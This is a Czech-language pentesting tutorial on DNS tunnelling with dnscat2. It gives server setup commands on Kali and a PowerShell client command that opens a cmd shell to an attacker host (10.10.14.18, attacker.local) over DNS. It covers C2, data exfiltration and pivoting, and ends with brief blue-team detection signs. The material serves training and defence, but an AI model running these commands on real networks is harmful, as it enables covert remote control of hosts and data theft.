# DNS Tunneling – DNSCAT2

## Co je DNS Tunneling

**DNS Tunneling** je technika, která využívá DNS protokol jako komunikační kanál pro přenos dat.

Normálně DNS slouží pouze k překladu:

```
google.com → 142.250.x.x
```

Při DNS tunnelingu se DNS dotazy zneužijí pro:

- Command & Control (C2)
- přenos příkazů
- exfiltraci dat
- vytvoření skrytého komunikačního kanálu

Nejznámější nástroj:

```
Dnscat2
```

Princip:

```
Compromised Host
        |
        | DNS Queries
        |
Internal DNS Resolver
        |
        |
Internet DNS
        |
        |
Attacker DNS Server
(Dnscat2)
```

---

# 1. Kdy použít DNS Tunneling

Použití:

✅ HTTP/HTTPS komunikace blokována  
✅ Firewall povoluje pouze DNS  
✅ Přímý reverse shell nefunguje  
✅ Potřebuješ alternativní C2 kanál

Typický scénář:

```
Kali
 |
 |
Firewall
 |
 |
Internal Windows Host
 |
 |
DNS Server
 |
 |
Internet
```

Windows nemůže:

```
443 ❌
8080 ❌
SSH ❌
```

Ale může:

```
DNS 53 ✅
```

---

# 2. Princip komunikace

Klient neposílá data přímo:

```
Windows → Kali
```

Ale:

```
Windows
 |
 | DNS request
 |
abc123.attacker-domain.com
 |
DNS Server
 |
Kali Dnscat2
```

Data jsou rozdělená do malých částí:

```
command:
whoami

↓

DNS query:

a83jd82js.attacker.com
```

Server data složí zpět.

---

# 3. Instalace Dnscat2 serveru (Kali)

Stažení:

```
git clone https://github.com/iagox86/dnscat2.git
```

Přejít do serveru:

```
cd dnscat2/server
```

Instalace závislostí:

```
sudo gem install bundler
bundle install
```

---

# 4. Spuštění DNS serveru

Formát:

```
sudo ruby dnscat2.rb \
--dns host=<KALI_IP>,port=53,domain=<DOMENA> \
--no-cache
```

Příklad:

```
sudo ruby dnscat2.rb \
--dns host=10.10.14.18,port=53,domain=attacker.local \
--no-cache
```

Po spuštění server vytvoří:

```
PreSharedSecret
```

Tento klíč potřebuje klient.

---

# 5. DNSCAT2 klient na Windows

Po získání přístupu na Windows nahraješ klienta.

PowerShell varianta:

```
Import-Module .\dnscat2.ps1
```

Spuštění:

```
Start-Dnscat2 `
-DNSserver 10.10.14.18 `
-Domain attacker.local `
-PreSharedSecret SECRET `
-Exec cmd
```

---

# 6. Správa relace na Kali

Po úspěšném připojení:

```
New window created
```

Zobrazení relací:

```
dnscat2> windows
```

Výstup:

```
1 - command session
```

Připojení:

```
dnscat2> window -i 1
```

Nyní máš:

```
C:\>
```

---

# 7. Praktické použití

## A) C2 komunikace

DNS tunneling může fungovat jako záložní C2 kanál.

Například:

```
Meterpreter
     |
     X
     |
DNSCAT2
     |
     |
Compromised Host
```

Použití:

- backup přístup
- alternativní komunikace
- obejití restrikcí

---

# B) Exfiltrace dat

Pokud síť blokuje:

```
HTTP upload ❌
FTP ❌
SMB ❌
```

DNS může být využito jako transport.

Data:

```
secret.txt

↓

DNS packets

↓

Attacker
```

---

# C) Pivoting přes izolovanou síť

Scénář:

```
Kali
 |
 |
Windows Pivot
 |
 |
Internal Network
```

DNS tunel může vytvořit spojení bez:

- SSH
- VPN
- klasických port forwardů

---

# 8. Detekce Blue Teamem

DNS tunneling není neviditelný.

Moderní SOC sleduje:

---

## 1. Vysoký počet DNS dotazů

Normálně:

```
PC → několik DNS dotazů/min
```

Podezřelé:

```
PC → tisíce dotazů/hodinu
```

---

## 2. Vysoká entropie domén

Normální:

```
google.com
microsoft.com
```

Podezřelé:

```
a8d92jf82jd92.attacker.com
```

Znaky:

- dlouhé subdomény
- náhodné znaky
- vysoká entropie

---

## 3. Neobvyklé DNS typy

Často:

```
TXT records
```

nebo:

```
NULL records
```

---

# DNS Tunneling vs ostatní C2

|Technologie|Výhoda|Nevýhoda|
|---|---|---|
|HTTPS C2|Rychlé, běžné|TLS inspection|
|SSH Tunnel|Stabilní|často blokované|
|Socat|Jednoduché|potřebuje port|
|Chisel|Flexibilní|binárka|
|DNSCAT2|Funguje přes DNS|pomalé|

---

# Pentester workflow

```
Initial Access
        |
        ↓
Zjistit egress pravidla

        |
        ↓

HTTPS funguje?
        |
        ├── Ano → HTTPS C2
        |
        └── Ne

DNS funguje?
        |
        └── Ano

        ↓

DNSCAT2

        ↓

C2 / Exfiltrace / Pivot
```